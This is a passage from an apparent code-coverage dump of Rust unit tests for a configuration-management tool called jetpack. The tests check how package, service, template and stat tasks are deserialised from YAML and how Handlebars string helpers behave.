/var/log/syslog\nsave: syslog_stat\n\"#;\n\n    let task: Result\u003cStatTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.path, \"/var/log/syslog\");\n    assert_eq!(task.save, \"syslog_stat\");\n    assert!(task.name.is_none());\n}\n\n#[test]\nfn test_stat_task_with_template_variables() {\n    let yaml = r#\"\npath: \"{{ config_dir }}/{{ app_name }}.conf\"\nsave: \"{{ app_name }}_config_stat\"\nwith:\n  condition: \"{{ validate_config }}\"\n\"#;\n\n    let task: Result\u003cStatTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.path.contains(\"{{ config_dir }}\"));\n    assert!(task.save.contains(\"{{ app_name }}\"));\n    assert!(task.with.is_some());\n}\n\n#[test]\nfn test_stat_task_with_items() {\n    let yaml = r#\"\nname: Check multiple files\npath: \"{{ item }}\"\nsave: \"file_{{ item | basename }}_stat\"\nwith:\n  items: \"{{ files_to_check }}\"\n\"#;\n\n    let task: Result\u003cStatTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Check multiple files\".to_string()));\n    assert!(task.path.contains(\"{{ item }}\"));\n    assert!(task.save.contains(\"{{ item | basename }}\"));\n    assert!(task.with.is_some());\n    assert!(task.with.as_ref().unwrap().items.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","files","template.rs"],"content":"use jetpack::modules::files::template::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_template_task_basic() {\n    let task = TemplateTask {\n        name: Some(\"Deploy config template\".to_string()),\n        src: \"templates/app.conf.j2\".to_string(),\n        dest: \"/etc/app/app.conf\".to_string(),\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"template\");\n    assert_eq!(task.get_name(), Some(\"Deploy config template\".to_string()));\n    assert_eq!(task.src, \"templates/app.conf.j2\");\n    assert_eq!(task.dest, \"/etc/app/app.conf\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_template_task_with_attributes() {\n    let attrs = FileAttributesInput {\n        owner: Some(\"nginx\".to_string()),\n        group: Some(\"nginx\".to_string()),\n        mode: Some(\"0640\".to_string()),\n    };\n\n    let task = TemplateTask {\n        name: None,\n        src: \"nginx.conf.j2\".to_string(),\n        dest: \"/etc/nginx/nginx.conf\".to_string(),\n        attributes: Some(attrs),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"template\");\n    assert!(task.attributes.is_some());\n    let attrs = task.attributes.as_ref().unwrap();\n    assert_eq!(attrs.owner, Some(\"nginx\".to_string()));\n    assert_eq!(attrs.mode, Some(\"0640\".to_string()));\n}\n\n#[test]\nfn test_template_task_deserialization() {\n    let yaml = r#\"\nname: Deploy database config\nsrc: templates/database.yml.j2\ndest: /opt/app/config/database.yml\nattributes:\n  owner: app\n  group: app\n  mode: \"0600\"\n\"#;\n\n    let task: Result\u003cTemplateTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Deploy database config\".to_string()));\n    assert_eq!(task.src, \"templates/database.yml.j2\");\n    assert_eq!(task.dest, \"/opt/app/config/database.yml\");\n    assert!(task.attributes.is_some());\n}\n\n#[test]\nfn test_template_task_deserialization_minimal() {\n    let yaml = r#\"\nsrc: motd.j2\ndest: /etc/motd\n\"#;\n\n    let task: Result\u003cTemplateTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.src, \"motd.j2\");\n    assert_eq!(task.dest, \"/etc/motd\");\n    assert!(task.name.is_none());\n    assert!(task.attributes.is_none());\n}\n\n#[test]\nfn test_template_task_with_logic() {\n    let yaml = r#\"\nsrc: \"templates/{{ env }}.conf.j2\"\ndest: /etc/app/config.conf\nwith:\n  condition: \"{{ deploy_config }}\"\nand:\n  notify: \"restart_app\"\n  retry: \"3\"\n  delay: \"5\"\n\"#;\n\n    let task: Result\u003cTemplateTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}\n\n#[test]\nfn test_template_task_with_variables() {\n    let yaml = r#\"\nname: Deploy environment-specific config\nsrc: \"templates/{{ app_name }}/{{ environment }}.conf.j2\"\ndest: \"/etc/{{ app_name }}/config.conf\"\nattributes:\n  owner: \"{{ app_user }}\"\n  group: \"{{ app_group }}\"\n  mode: \"0644\"\n\"#;\n\n    let task: Result\u003cTemplateTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Deploy environment-specific config\".to_string()));\n    assert!(task.src.contains(\"{{ app_name }}\"));\n    assert!(task.dest.contains(\"{{ app_name }}\"));\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","mod.rs"],"content":"pub mod control;\npub mod files;\npub mod packages;\npub mod commands;\npub mod services;\npub mod access;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","packages","apt.rs"],"content":"use jetpack::modules::packages::apt::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_apt_task_basic() {\n    let task = AptTask {\n        name: Some(\"Install nginx\".to_string()),\n        package: \"nginx\".to_string(),\n        version: None,\n        update: None,\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"apt\");\n    assert_eq!(task.get_name(), Some(\"Install nginx\".to_string()));\n    assert_eq!(task.package, \"nginx\");\n    assert!(task.version.is_none());\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_apt_task_with_version() {\n    let task = AptTask {\n        name: None,\n        package: \"postgresql\".to_string(),\n        version: Some(\"14\".to_string()),\n        update: None,\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"apt\");\n    assert_eq!(task.package, \"postgresql\");\n    assert_eq!(task.version, Some(\"14\".to_string()));\n}\n\n#[test]\nfn test_apt_task_remove() {\n    let task = AptTask {\n        name: Some(\"Remove old package\".to_string()),\n        package: \"apache2\".to_string(),\n        version: None,\n        update: None,\n        remove: Some(\"yes\".to_string()),\n        with: None,\n        and: None,\n    };\n\n    assert!(task.remove.is_some());\n    assert_eq!(task.remove.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_apt_task_with_update() {\n    let task = AptTask {\n        name: Some(\"Install latest vim\".to_string()),\n        package: \"vim\".to_string(),\n        version: None,\n        update: Some(\"yes\".to_string()),\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert!(task.update.is_some());\n    assert_eq!(task.update.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_apt_task_deserialization() {\n    let yaml = r#\"\nname: Install web server\npackage: nginx\nversion: \"1.22\"\nupdate: \"yes\"\n\"#;\n\n    let task: Result\u003cAptTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Install web server\".to_string()));\n    assert_eq!(task.package, \"nginx\");\n    assert_eq!(task.version, Some(\"1.22\".to_string()));\n    assert_eq!(task.update, Some(\"yes\".to_string()));\n}\n\n#[test]\nfn test_apt_task_deserialization_minimal() {\n    let yaml = r#\"\npackage: git\n\"#;\n\n    let task: Result\u003cAptTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.package, \"git\");\n    assert!(task.name.is_none());\n    assert!(task.version.is_none());\n    assert!(task.update.is_none());\n    assert!(task.remove.is_none());\n}\n\n#[test]\nfn test_apt_task_with_logic() {\n    let yaml = r#\"\npackage: \"{{ package_name }}\"\nversion: \"{{ package_version | default('latest') }}\"\nwith:\n  condition: \"{{ install_packages }}\"\nand:\n  notify: \"restart_service\"\n\"#;\n\n    let task: Result\u003cAptTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.package.contains(\"{{ package_name }}\"));\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","packages","homebrew.rs"],"content":"use jetpack::modules::packages::homebrew::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_homebrew_task_basic() {\n    let task = HomebrewTask {\n        name: Some(\"Install wget\".to_string()),\n        package: \"wget\".to_string(),\n        version: None,\n        update: None,\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"homebrew\");\n    assert_eq!(task.get_name(), Some(\"Install wget\".to_string()));\n    assert_eq!(task.package, \"wget\");\n    assert!(task.version.is_none());\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_homebrew_task_with_version() {\n    let task = HomebrewTask {\n        name: None,\n        package: \"node\".to_string(),\n        version: Some(\"18\".to_string()),\n        update: None,\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"homebrew\");\n    assert_eq!(task.package, \"node\");\n    assert_eq!(task.version, Some(\"18\".to_string()));\n}\n\n#[test]\nfn test_homebrew_task_remove() {\n    let task = HomebrewTask {\n        name: Some(\"Uninstall old tool\".to_string()),\n        package: \"python@3.9\".to_string(),\n        version: None,\n        update: None,\n        remove: Some(\"yes\".to_string()),\n        with: None,\n        and: None,\n    };\n\n    assert!(task.remove.is_some());\n    assert_eq!(task.remove.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_homebrew_task_with_update() {\n    let task = HomebrewTask {\n        name: Some(\"Update git\".to_string()),\n        package: \"git\".to_string(),\n        version: None,\n        update: Some(\"yes\".to_string()),\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert!(task.update.is_some());\n    assert_eq!(task.update.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_homebrew_task_deserialization() {\n    let yaml = r#\"\nname: Install development tools\npackage: rust\nupdate: \"yes\"\n\"#;\n\n    let task: Result\u003cHomebrewTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Install development tools\".to_string()));\n    assert_eq!(task.package, \"rust\");\n    assert_eq!(task.update, Some(\"yes\".to_string()));\n}\n\n#[test]\nfn test_homebrew_task_deserialization_minimal() {\n    let yaml = r#\"\npackage: tmux\n\"#;\n\n    let task: Result\u003cHomebrewTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.package, \"tmux\");\n    assert!(task.name.is_none());\n    assert!(task.version.is_none());\n}\n\n#[test]\nfn test_homebrew_task_with_logic() {\n    let yaml = r#\"\npackage: \"{{ tool_name }}\"\nwith:\n  condition: \"{{ is_macos }}\"\nand:\n  notify: \"tool_installed\"\n\"#;\n\n    let task: Result\u003cHomebrewTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.package.contains(\"{{ tool_name }}\"));\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","packages","mod.rs"],"content":"mod apt;\nmod homebrew;\nmod yum_dnf;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","packages","yum_dnf.rs"],"content":"use jetpack::modules::packages::yum_dnf::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_yum_dnf_task_basic() {\n    let task = YumDnfTask {\n        name: Some(\"Install httpd\".to_string()),\n        package: \"httpd\".to_string(),\n        version: None,\n        update: None,\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"yum_dnf\");\n    assert_eq!(task.get_name(), Some(\"Install httpd\".to_string()));\n    assert_eq!(task.package, \"httpd\");\n    assert!(task.version.is_none());\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_yum_dnf_task_with_version() {\n    let task = YumDnfTask {\n        name: None,\n        package: \"mariadb-server\".to_string(),\n        version: Some(\"10.5\".to_string()),\n        update: None,\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"yum_dnf\");\n    assert_eq!(task.package, \"mariadb-server\");\n    assert_eq!(task.version, Some(\"10.5\".to_string()));\n}\n\n#[test]\nfn test_yum_dnf_task_remove() {\n    let task = YumDnfTask {\n        name: Some(\"Remove old package\".to_string()),\n        package: \"php-5.6\".to_string(),\n        version: None,\n        update: None,\n        remove: Some(\"yes\".to_string()),\n        with: None,\n        and: None,\n    };\n\n    assert!(task.remove.is_some());\n    assert_eq!(task.remove.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_yum_dnf_task_with_update() {\n    let task = YumDnfTask {\n        name: Some(\"Update kernel\".to_string()),\n        package: \"kernel\".to_string(),\n        version: None,\n        update: Some(\"yes\".to_string()),\n        remove: None,\n        with: None,\n        and: None,\n    };\n\n    assert!(task.update.is_some());\n    assert_eq!(task.update.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_yum_dnf_task_deserialization() {\n    let yaml = r#\"\nname: Install database server\npackage: postgresql-server\nversion: \"13\"\nupdate: \"yes\"\n\"#;\n\n    let task: Result\u003cYumDnfTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Install database server\".to_string()));\n    assert_eq!(task.package, \"postgresql-server\");\n    assert_eq!(task.version, Some(\"13\".to_string()));\n    assert_eq!(task.update, Some(\"yes\".to_string()));\n}\n\n#[test]\nfn test_yum_dnf_task_deserialization_minimal() {\n    let yaml = r#\"\npackage: vim-enhanced\n\"#;\n\n    let task: Result\u003cYumDnfTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.package, \"vim-enhanced\");\n    assert!(task.name.is_none());\n    assert!(task.version.is_none());\n}\n\n#[test]\nfn test_yum_dnf_task_with_logic() {\n    let yaml = r#\"\npackage: \"{{ rpm_package }}\"\nversion: \"{{ rpm_version | default('latest') }}\"\nwith:\n  condition: \"{{ is_redhat_based }}\"\nand:\n  notify: \"restart_service\"\n\"#;\n\n    let task: Result\u003cYumDnfTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.package.contains(\"{{ rpm_package }}\"));\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","services","mod.rs"],"content":"mod sd_service;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","services","sd_service.rs"],"content":"use jetpack::modules::services::sd_service::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_systemd_service_task_basic() {\n    let task = SystemdServiceTask {\n        name: Some(\"Enable nginx\".to_string()),\n        service: \"nginx\".to_string(),\n        enabled: None,\n        started: None,\n        restart: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"sd_service\");\n    assert_eq!(task.get_name(), Some(\"Enable nginx\".to_string()));\n    assert_eq!(task.service, \"nginx\");\n    assert!(task.enabled.is_none());\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_systemd_service_task_enabled_started() {\n    let task = SystemdServiceTask {\n        name: None,\n        service: \"postgresql\".to_string(),\n        enabled: Some(\"yes\".to_string()),\n        started: Some(\"yes\".to_string()),\n        restart: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"sd_service\");\n    assert_eq!(task.service, \"postgresql\");\n    assert_eq!(task.enabled, Some(\"yes\".to_string()));\n    assert_eq!(task.started, Some(\"yes\".to_string()));\n}\n\n#[test]\nfn test_systemd_service_task_restart() {\n    let task = SystemdServiceTask {\n        name: Some(\"Restart web server\".to_string()),\n        service: \"httpd\".to_string(),\n        enabled: None,\n        started: None,\n        restart: Some(\"yes\".to_string()),\n        with: None,\n        and: None,\n    };\n\n    assert!(task.restart.is_some());\n    assert_eq!(task.restart.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_systemd_service_task_disabled_stopped() {\n    let task = SystemdServiceTask {\n        name: Some(\"Disable service\".to_string()),\n        service: \"firewalld\".to_string(),\n        enabled: Some(\"no\".to_string()),\n        started: Some(\"no\".to_string()),\n        restart: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.enabled, Some(\"no\".to_string()));\n    assert_eq!(task.started, Some(\"no\".to_string()));\n}\n\n#[test]\nfn test_systemd_service_task_deserialization() {\n    let yaml = r#\"\nname: Manage database service\nservice: mariadb\nenabled: \"yes\"\nstarted: \"yes\"\n\"#;\n\n    let task: Result\u003cSystemdServiceTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Manage database service\".to_string()));\n    assert_eq!(task.service, \"mariadb\");\n    assert_eq!(task.enabled, Some(\"yes\".to_string()));\n    assert_eq!(task.started, Some(\"yes\".to_string()));\n}\n\n#[test]\nfn test_systemd_service_task_deserialization_minimal() {\n    let yaml = r#\"\nservice: sshd\n\"#;\n\n    let task: Result\u003cSystemdServiceTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.service, \"sshd\");\n    assert!(task.name.is_none());\n    assert!(task.enabled.is_none());\n    assert!(task.started.is_none());\n    assert!(task.restart.is_none());\n}\n\n#[test]\nfn test_systemd_service_task_with_logic() {\n    let yaml = r#\"\nservice: \"{{ app_service_name }}\"\nenabled: \"{{ enable_service | default('yes') }}\"\nstarted: \"yes\"\nwith:\n  condition: \"{{ is_systemd }}\"\nand:\n  notify: \"service_configured\"\n\"#;\n\n    let task: Result\u003cSystemdServiceTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.service.contains(\"{{ app_service_name }}\"));\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}\n\n#[test]\nfn test_systemd_service_task_restart_only() {\n    let yaml = r#\"\nname: Restart application\nservice: myapp\nrestart: \"yes\"\n\"#;\n\n    let task: Result\u003cSystemdServiceTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Restart application\".to_string()));\n    assert_eq!(task.service, \"myapp\");\n    assert_eq!(task.restart, Some(\"yes\".to_string()));\n    assert!(task.enabled.is_none());\n    assert!(task.started.is_none());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","playbooks","language.rs"],"content":"use jetpack::playbooks::language::*;\nuse serde_yaml;\n\n#[test]\nfn test_play_debug() {\n    let play = Play {\n        name: \"Test Play\".to_string(),\n        groups: vec![\"web\".to_string(), \"db\".to_string()],\n        roles: None,\n        defaults: None,\n        vars: None,\n        vars_files: None,\n        sudo: None,\n        sudo_template: None,\n        ssh_user: None,\n        ssh_port: None,\n        tasks: None,\n        handlers: None,\n        batch_size: None,\n    };\n    \n    let debug_str = format!(\"{:?}\", play);\n    assert!(debug_str.contains(\"Test Play\"));\n    assert!(debug_str.contains(\"web\"));\n    assert!(debug_str.contains(\"db\"));\n}\n\n#[test]\nfn test_play_with_options() {\n    let mut vars = serde_yaml::Mapping::new();\n    vars.insert(\n        serde_yaml::Value::String(\"test_var\".to_string()),\n        serde_yaml::Value::String(\"test_value\".to_string()),\n    );\n    \n    let play = Play {\n        name: \"Complex Play\".to_string(),\n        groups: vec![\"all\".to_string()],\n        roles: Some(vec![\n            RoleInvocation {\n                role: \"common\".to_string(),\n                vars: None,\n                tags: Some(vec![\"setup\".to_string()]),\n            }\n        ]),\n        defaults: None,\n        vars: Some(vars.clone()),\n        vars_files: Some(vec![\"vars.yml\".to_string()]),\n        sudo: Some(\"root\".to_string()),\n        sudo_template: Some(\"sudo -u {{user}}\".to_string()),\n        ssh_user: Some(\"deploy\".to_string()),\n        ssh_port: Some(2222),\n        tasks: None,\n        handlers: None,\n        batch_size: Some(10),\n    };\n    \n    assert_eq!(play.name, \"Complex Play\");\n    assert_eq!(play.groups.len(), 1);\n    assert!(play.roles.is_some());\n    assert!(play.vars.is_some());\n    assert_eq!(play.ssh_port, Some(2222));\n    assert_eq!(play.batch_size, Some(10));\n}\n\n#[test]\nfn test_role_debug() {\n    let role = Role {\n        name: \"common\".to_string(),\n        defaults: None,\n        tasks: Some(vec![\"task1.yml\".to_string(), \"task2.yml\".to_string()]),\n        handlers: Some(vec![\"handler1.yml\".to_string()]),\n    };\n    \n    let debug_str = format!(\"{:?}\", role);\n    assert!(debug_str.contains(\"common\"));\n    assert!(debug_str.contains(\"task1.yml\"));\n    assert!(debug_str.contains(\"handler1.yml\"));\n}\n\n#[test]\nfn test_role_clone() {\n    let role = Role {\n        name: \"test\".to_string(),\n        defaults: None,\n        tasks: Some(vec![\"task.yml\".to_string()]),\n        handlers: None,\n    };\n    \n    let cloned = role.clone();\n    assert_eq!(cloned.name, role.name);\n    assert_eq!(cloned.tasks, role.tasks);\n}\n\n#[test]\nfn test_role_invocation_debug() {\n    let mut vars = serde_yaml::Mapping::new();\n    vars.insert(\n        serde_yaml::Value::String(\"var1\".to_string()),\n        serde_yaml::Value::String(\"value1\".to_string()),\n    );\n    \n    let invocation = RoleInvocation {\n        role: \"webserver\".to_string(),\n        vars: Some(vars),\n        tags: Some(vec![\"web\".to_string(), \"nginx\".to_string()]),\n    };\n    \n    let debug_str = format!(\"{:?}\", invocation);\n    assert!(debug_str.contains(\"webserver\"));\n    assert!(debug_str.contains(\"var1\"));\n    assert!(debug_str.contains(\"web\"));\n    assert!(debug_str.contains(\"nginx\"));\n}\n\n#[test]\nfn test_role_invocation_minimal() {\n    let invocation = RoleInvocation {\n        role: \"minimal\".to_string(),\n        vars: None,\n        tags: None,\n    };\n    \n    assert_eq!(invocation.role, \"minimal\");\n    assert!(invocation.vars.is_none());\n    assert!(invocation.tags.is_none());\n}\n\n#[test]\nfn test_play_deserialization() {\n    let yaml = r#\"\nname: Test Play\ngroups:\n  - web\n  - db\n\"#;\n    \n    let play: Result\u003cPlay, _\u003e = serde_yaml::from_str(yaml);\n    assert!(play.is_ok());\n    \n    let play = play.unwrap();\n    assert_eq!(play.name, \"Test Play\");\n    assert_eq!(play.groups.len(), 2);\n    assert!(play.groups.contains(\u0026\"web\".to_string()));\n    assert!(play.groups.contains(\u0026\"db\".to_string()));\n}\n\n#[test]\nfn test_role_deserialization() {\n    let yaml = r#\"\nname: common\ntasks:\n  - install.yml\n  - configure.yml\nhandlers:\n  - restart.yml\n\"#;\n    \n    let role: Result\u003cRole, _\u003e = serde_yaml::from_str(yaml);\n    assert!(role.is_ok());\n    \n    let role = role.unwrap();\n    assert_eq!(role.name, \"common\");\n    assert!(role.tasks.is_some());\n    assert_eq!(role.tasks.as_ref().unwrap().len(), 2);\n    assert!(role.handlers.is_some());\n}\n\n#[test]\nfn test_role_invocation_deserialization() {\n    let yaml = r#\"\nrole: nginx\ntags:\n  - web\n  - proxy\n\"#;\n    \n    let invocation: Result\u003cRoleInvocation, _\u003e = serde_yaml::from_str(yaml);\n    assert!(invocation.is_ok());\n    \n    let invocation = invocation.unwrap();\n    assert_eq!(invocation.role, \"nginx\");\n    assert!(invocation.tags.is_some());\n    assert_eq!(invocation.tags.as_ref().unwrap().len(), 2);\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","playbooks","mod.rs"],"content":"mod t_helpers;\nmod templar;\nmod language;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","playbooks","t_helpers.rs"],"content":"use jetpack::playbooks::t_helpers::*;\nuse handlebars::{Handlebars, no_escape, Helper, RenderContext, Context, HelperDef, ScopedJson, JsonValue, RenderError};\nuse serde_json::json;\nuse std::error::Error;\nuse std::collections::HashMap;\n\npub fn new_handlebars\u003c'reg\u003e() -\u003e Handlebars\u003c'reg\u003e {\n    let mut handlebars = Handlebars::new();\n    handlebars.set_strict_mode(true);\n    handlebars.register_escape_fn(no_escape); //html escaping is the default and cause issue\n    register_helpers(\u0026mut handlebars);\n    handlebars\n}\n\n#[macro_export]\nmacro_rules! assert_renders {\n    ($($arg:expr),+$(,)?) =\u003e {{\n        use std::collections::HashMap;\n        let vs: HashMap\u003cString, String\u003e = HashMap::new();\n        let mut handlebars = new_handlebars();\n        $({\n            let sample: (\u0026str, \u0026str) = $arg;\n            handlebars.register_template_string(\u0026sample.0, \u0026sample.0).expect(\"register_template_string\");\n            assert_eq!(handlebars.render(\u0026sample.0, \u0026vs).expect(\"render\"), sample.1.to_owned());\n        })*\n        Ok(())\n    }}\n}\n\nfn test_condition(condition: \u0026str, expected: bool) {\n    let handlebars = new_handlebars();\n    let result = handlebars\n        .render_template(\n            \u0026format!(\n                \"{{{{#if {condition}}}}}lorem{{{{else}}}}ipsum{{{{/if}}}}\",\n                condition = condition\n            ),\n            \u0026json!({}),\n        )\n        .unwrap();\n    assert_eq!(\u0026result, if expected { \"lorem\" } else { \"ipsum\" }, \"testing condition: {}\", condition);\n}\n\n#[test]\nfn test_register_string_helpers() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    assert_renders![\n        (r##\"{{ to_lower_case \"Hello foo-bars\" }}\"##, r##\"hello foo-bars\"##),\n        (r##\"{{ to_upper_case \"Hello foo-bars\" }}\"##, r##\"HELLO FOO-BARS\"##)\n    ]\n}\n\n#[test]\nfn test_helper_trim() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    assert_renders![\n        (r##\"{{ trim \"foo\" }}\"##, r##\"foo\"##),\n        (r##\"{{ trim \"  foo\" }}\"##, r##\"foo\"##),\n        (r##\"{{ trim \"foo  \" }}\"##, r##\"foo\"##),\n        (r##\"{{ trim \" foo \" }}\"##, r##\"foo\"##)\n    ]\n}\n\n#[test]\nfn test_helper_trim_start() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    assert_renders![\n        (r##\"{{ trim_start \"foo\" }}\"##, r##\"foo\"##),\n        (r##\"{{ trim_start \"  foo\" }}\"##, r##\"foo\"##),\n        (r##\"{{ trim_start \"foo  \" }}\"##, r##\"foo  \"##),\n        (r##\"{{ trim_start \" foo \" }}\"##, r##\"foo \"##)\n    ]\n}\n\n#[test]\nfn test_helper_trim_end() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    assert_renders![\n        (r##\"{{ trim_end \"foo\" }}\"##, r##\"foo\"##),\n        (r##\"{{ trim_end \"foo  \" }}\"##, r##\"foo\"##),\n        (r##\"{{ trim_end \"  foo\" }}\"##, r##\"  foo\"##),\n        (r##\"{{ trim_end \" foo \" }}\"##, r##\" foo\"##)\n    ]\n}\n\n#[test]\nfn test_helper_contains() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    test_condition(r#\"( contains \"foo\" \"bar\" )\"#, false);\n    test_condition(r#\"( contains \"foo\" \"foo\" )\"#, true);\n    test_condition(r#\"( contains \"barfoobar\" \"foo\" )\"#, true);\n    test_condition(r#\"( contains \"foo\" \"barfoobar\" )\"#, false);\n\n    Ok(())\n}\n\n#[test]\nfn test_helper_starts_with() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    test_condition(r#\"( starts_with \"foo\" \"bar\" )\"#, false);\n    test_condition(r#\"( starts_with \"foobar\" \"foo\" )\"#, true);\n    test_condition(r#\"( starts_with \"foo\" \"foobar\" )\"#, false);\n\n    Ok(())\n}\n\n#[test]\nfn test_helper_ends_with() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    test_condition(r#\"( ends_with \"foo\" \"bar\" )\"#, false);\n    test_condition(r#\"( ends_with \"foobar\" \"bar\" )\"#, true);\n    test_condition(r#\"( ends_with \"foo\" \"foobar\" )\"#, false);\n\n    Ok(())\n}\n\n#[test]\nfn test_isdefined_none() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    let handlebars = new_handlebars();\n\n    let result = handlebars.render_template(\n        r#\"{{isdefined a}} {{isdefined b}} {{#if (isdefined a)}}a{{/if}} {{#if (isdefined b)}}b{{/if}}\"#,\n        \u0026json!({})\n    );\n    assert_eq!(result.unwrap(), \"false false  \");\n    Ok(())\n}\n\n#[test]\nfn test_isdefined_a_and_b() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    let handlebars = new_handlebars();\n\n    let result = handlebars.render_template(\n        r#\"{{isdefined a}} {{isdefined b}} {{#if (isdefined a)}}a{{/if}} {{#if (isdefined b)}}b{{/if}}\"#,\n        \u0026json!({\"a\": 1, \"b\": 2})\n    );\n    assert_eq!(result.unwrap(), \"true true a b\");\n    Ok(())\n}\n\n#[test]\nfn test_isdefined_a() -\u003e Result\u003c(), Box\u003cdyn Error\u003e\u003e {\n    let handlebars = new_handlebars();\n\n    let result = handlebars.render_template(\n        r#\"{{isdefined a}} {{isdefined b}} {{#if (isdefined a)}}a{{/if}} {{#if (isdefined b)}}b{{/if}}\"#,\n        \u0026json!({\"a\": 1})\n    );\n    assert_eq!(result.unwrap(), \"true false a \");\n    Ok(())\n}\n\n#[test]\nfn test_isdefined_helper_with_two_params() {\n    let handlebars = 